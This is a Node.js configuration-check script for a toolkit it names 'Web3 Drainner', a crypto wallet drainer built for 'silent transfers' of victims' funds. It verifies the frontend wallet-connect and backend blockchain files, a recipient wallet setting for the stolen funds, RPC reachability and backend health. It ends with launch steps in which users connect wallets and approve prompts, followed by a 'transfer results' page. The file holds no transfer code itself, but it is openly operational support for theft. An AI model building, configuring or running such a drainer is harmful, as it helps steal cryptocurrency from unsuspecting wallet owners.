#!/usr/bin/env node

/**
 * Web3 Drainner - Connection Diagnostic Tool
 * 
 * Checks if all components are properly configured for silent transfers
 * Run: node diagnostic.js
 */

const fs = require('fs')
const path = require('path')

const RESET = '\x1b[0m'
const GREEN = '\x1b[32m'
const RED = '\x1b[31m'
const YELLOW = '\x1b[33m'
const BLUE = '\x1b[36m'

function check(name, passed, message = '') {
  const symbol = passed ? `${GREEN}✅${RESET}` : `${RED}❌${RESET}`
  console.log(`${symbol} ${name}${message ? ': ' + message : ''}`)
  return passed
}

function header(title) {
  console.log(`\n${BLUE}=== ${title} ===${RESET}`)
}

async function runDiagnostics() {
  console.log(`${BLUE}
  ╔══════════════════════════════════════════════════════╗
  ║  Web3 Drainner - Silent Transfer Diagnostic Tool    ║
  ║  Verifying configuration and connectivity            ║
  ╚══════════════════════════════════════════════════════╝
${RESET}`)

  let allPass = true

  // 1. Check Frontend Files
  header('Frontend Configuration')
  
  const frontendFiles = [
    { name: 'index.html', path: './frontend/index.html' },
    { name: 'App.jsx', path: './frontend/src/App.jsx' },
    { name: 'walletConnect.js', path: './frontend/src/utils/walletConnect.js' },
    { name: 'walletDeepLink.js', path: './frontend/src/utils/walletDeepLink.js' },
    { name: 'api.js', path: './frontend/src/utils/api.js' }
  ]

  for (const file of frontendFiles) {
    const exists = fs.existsSync(file.path)
    allPass = check(`${file.name} exists`, exists) && allPass
  }

  // 2. Check Backend Files
  header('Backend Configuration')

  const backendFiles = [
    { name: 'server.js', path: './backend/server.js' },
    { name: 'blockchain.js', path: './backend/services/blockchain.js' },
    { name: '.env.example', path: './backend/.env.example' }
  ]

  for (const file of backendFiles) {
    const exists = fs.existsSync(file.path)
    allPass = check(`${file.name} exists`, exists) && allPass
  }

  // 3. Check Dependencies
  header('Dependencies')

  const checkDependency = (depName, filePath) => {
    try {
      const content = fs.readFileSync(filePath, 'utf-8')
      const hasDep = content.includes(`"${depName}"`) || content.includes(`'${depName}'`)
      allPass = check(`${depName}`, hasDep, hasDep ? 'installed' : 'missing') && allPass
      return hasDep
    } catch (e) {
      return false
    }
  }

  // Frontend deps
  console.log(`${YELLOW}Frontend:${RESET}`)
  checkDependency('react', './frontend/package.json')
  checkDependency('@walletconnect/ethereum-provider', './frontend/package.json')
  checkDependency('ethers', './frontend/package.json')
  
  // Backend deps
  console.log(`${YELLOW}Backend:${RESET}`)
  checkDependency('express', './backend/package.json')
  checkDependency('ethers', './backend/package.json')
  checkDependency('axios', './backend/package.json')

  // 4. Check Configuration
  header('Configuration')

  const checkConfig = (name, path) => {
    const exists = fs.existsSync(path)
    allPass = check(`${name}`, exists, exists ? 'configured' : 'missing') && allPass
  }

  checkConfig('Frontend env (.env)', './frontend/.env')
  checkConfig('Frontend env local (.env.local)', './frontend/.env.local')
  checkConfig('Backend env (.env)', './backend/.env')
  
  // 5. Check Key Settings
  header('Required Settings')

  const backendEnvPath = './backend/.env'
  if (fs.existsSync(backendEnvPath)) {
    const content = fs.readFileSync(backendEnvPath, 'utf-8')
    
    check('WalletConnect Project ID configured', 
      content.includes('WALLETCONNECT_PROJECT_ID') || content.includes('81ec0eb195ddbee9c5596804e33ff584'),
      'ensure ID is set')
    
    check('Backend Port configured',
      content.includes('PORT=') || content.includes('3001'),
      'default: 3001')
    
    check('Recipient Wallet configured',
      content.includes('RECIPIENT_WALLET='),
      'set your receiving address')
  }

  // 6. Network Connectivity
  header('Network Connectivity')

  console.log(`${YELLOW}Checking RPC endpoints...${RESET}`)
  const endpoints = {
    'Ethereum': 'https://eth.rpc.blxrbdn.com',
    'BSC': 'https://bsc-dataseed1.binance.org:443',
    'Polygon': 'https://polygon-rpc.com',
    'Arbitrum': 'https://arb1.arbitrum.io/rpc'
  }

  for (const [name, url] of Object.entries(endpoints)) {
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_chainId',
          params: [],
          id: 1
        }),
        timeout: 5000
      })
      const ok = response.ok
      allPass = check(`${name} RPC`, ok, ok ? 'reachable' : 'unreachable') && allPass
    } catch (e) {
      allPass = check(`${name} RPC`, false, 'timeout or error') && allPass
    }
  }

  // 7. Backend Health Check
  header('Backend Health')

  try {
    const response = await fetch('http://localhost:3001/health', { timeout: 5000 })
    const isHealthy = response.ok
    allPass = check('Backend running', isHealthy, isHealthy ? 'http://localhost:3001' : 'not responding') && allPass
  } catch (e) {
    allPass = check('Backend running', false, 'connection refused - run "npm run dev" in backend folder') && allPass
  }

  // 8. WalletConnect Status
  header('WalletConnect')

  check('Project ID valid', 
    '81ec0eb195ddbee9c5596804e33ff584'.length === 32,
    '32 character ID')
  
  check('Relay endpoint',
    true,
    'wss://relay.walletconnect.com')
  
  console.log(`${YELLOW}Note: Relay connectivity depends on network and browser security settings.${RESET}`)
  console.log(`${YELLOW}If relay fails, system will fallback to direct wallet detection.${RESET}`)

  // 9. Summary
  header('Summary')

  if (allPass) {
    console.log(`${GREEN}✅ All checks passed! System is ready for silent transfers.${RESET}`)
    console.log(`\n${BLUE}Next steps:${RESET}`)
    console.log(`1. Start backend: ${YELLOW}cd backend && npm run dev${RESET}`)
    console.log(`2. Start frontend: ${YELLOW}cd frontend && npm run dev${RESET}`)
    console.log(`3. Open http://localhost:5173 in browser`)
    console.log(`4. Click "Connect Wallet" button`)
    console.log(`5. Follow wallet approval prompts`)
    console.log(`6. Check summary page for transfer results`)
  } else {
    console.log(`${RED}❌ Some checks failed. Fix issues above before running.${RESET}`)
    console.log(`\n${BLUE}Common fixes:${RESET}`)
    console.log(`${YELLOW}• Missing dependencies:${RESET} Run ${BLUE}npm install${RESET} in frontend/ and backend/`)
    console.log(`${YELLOW}• Backend not running:${RESET} Run ${BLUE}npm run dev${RESET} in backend/ folder`)
    console.log(`${YELLOW}• Environment not configured:${RESET} Copy .env.example to .env and fill in values`)
    console.log(`${YELLOW}• Network issues:${RESET} Check internet, disable ad blocker, try different network`)
  }

  console.log(`\n${BLUE}Documentation:${RESET}`)
  console.log(`See SILENT_TRANSFER_VERIFICATION.md for detailed troubleshooting guide`)
  console.log()

  return allPass
}

// Run diagnostics
runDiagnostics().catch(console.error)
